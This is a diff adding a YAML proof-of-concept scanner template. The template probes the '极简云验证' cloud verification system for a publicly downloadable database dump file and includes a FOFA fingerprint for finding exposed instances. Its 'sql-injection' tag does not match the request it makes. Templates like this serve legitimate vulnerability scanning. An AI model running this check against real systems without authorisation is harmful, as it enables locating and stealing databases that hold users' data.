@@ -1,0 +1,16 @@
+id: poc-yaml-simple-cloud-auth-sensitive-info-leak
+info:
+  name: 极简云验证系统 敏感信息泄露漏洞
+  severity: medium
+  tags:
+  - sql-injection
+  finger: 极简云验证
+  fofa: body="../assets/img/bg/logo_white.png"
+requests:
+- method: GET
+  path: /%E6%95%B0%E6%8D%AE%E5%BA%93.sql
+  expression: "status_code == 200 && \ncontains(body,\"MySQL\") &&\ncontains(body,\"\
+    Database:\") &&\ncontains(body,\"Server version\") &&\ncontains(content_type,\"\
+    application/octet-stream\")\n"
+variables: {}
+transport: http
